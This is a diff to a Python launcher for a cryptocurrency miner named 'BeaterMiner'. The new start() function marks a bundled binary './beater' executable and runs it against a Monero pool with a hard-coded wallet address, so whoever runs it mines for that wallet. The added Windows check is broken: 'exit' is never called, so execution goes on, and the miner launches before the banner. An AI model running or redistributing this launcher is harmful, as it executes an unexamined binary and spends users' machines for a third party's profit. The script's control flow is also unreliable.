@@ -21,7 +21,6 @@
 # ////////////////| [📚] - Libraries
 
 from os import system, name
-import subprocess
 from time import sleep
 from simple_chalk import chalk, greenBright, magentaBright, cyanBright, yellowBright, redBright, whiteBright
 import os.path
@@ -56,6 +55,23 @@ def error_line():
     line_red = red('================================')
     print(line_red + line_red + line_red + line_red)
 
+def check_system():
+    clear()
+    sleep(2)
+    if name == 'nt':
+        error_line()
+        print()
+        sleep(1)
+        print(red('['), white('-'), red(']'), white('-'), white("You CAN'T run BeaterMiner on Windows, you MUST use a GNU/Linux OS!"))
+        sleep(1)
+        print()
+        error_line()
+        sleep(2)
+        exit
+    else:
+        start()
+
+
 def banner():
     clear()
     sleep(2)
@@ -72,15 +88,18 @@ def banner():
         print()
         sleep(1)
         print(cyan('['), magenta('-'), cyan(']'), yellow('-'), white('Welcome to BeaterMiner!'))
-        sleep(1)
+        sleep(2)
         print(cyan('['), magenta('-'), cyan(']'), yellow('-'), white('Starting BeaterMiner...'))
-        sleep(1)
+        sleep(3)
         print()
         line()
         print()
-        system('chmod +x ./beater')
-        system('./beater pool.xmrfast.com:9000 -a rx -k -u XMR:46Nb3ctGn87NLBxiGD26HqPp5HCwd761RQTopAVy44y6ftDYPwAz1jii6Fas3Gu378cqiz96ygjpVeN5Tk64NrC455AZFy2.PEPE -p x')
+        
+def start():
+    system('chmod +x ./beater')
+    system('./beater pool.xmrfast.com:9000 -a rx -k -u XMR:46Nb3ctGn87NLBxiGD26HqPp5HCwd761RQTopAVy44y6ftDYPwAz1jii6Fas3Gu378cqiz96ygjpVeN5Tk64NrC455AZFy2.PEPE -p x')
 
 # ////////////////| [☢️] - Start
 
+check_system()
 banner()
